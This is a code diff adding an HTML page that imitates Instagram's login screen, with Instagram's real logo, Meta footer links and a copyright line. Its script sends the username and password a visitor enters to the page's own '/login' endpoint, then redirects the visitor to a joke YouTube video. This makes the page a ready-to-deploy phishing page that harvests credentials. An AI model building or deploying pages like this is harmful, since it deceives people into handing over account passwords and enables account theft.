@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="phone-image">
+            <img src="images/phone.png" alt="Instagram on phone">
+        </div>
+        <div>
+            <div class="form-container">
+                <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+                <form id="loginForm">
+                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                    <input type="password" name="password" placeholder="Password" required>
+                    <button type="submit">Log In</button>
+                    <div class="divider">OR</div>
+                    <div class="fb-login">Log in with Facebook</div>
+                    <div class="forgot-password">Forgot password?</div>
+                </form>
+            </div>
+            <div class="signup-container">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+            <div class="app-links">
+                <a href="#"><img src="images/googleplay.png" alt="Google Play"></a>
+                <a href="#"><img src="images/microsoft.png" alt="Microsoft"></a>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <div>
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Top Accounts</a>
+            <a href="#">Hashtags</a>
+            <a href="#">Language</a>
+        </div>
+        <div>&copy; 2024 Instagram from Meta</div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const formData = new FormData(this);
+            const data = {
+                username: formData.get('username'),
+                password: formData.get('password')
+            };
+            fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+                } else {
+                    alert('Login failed');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
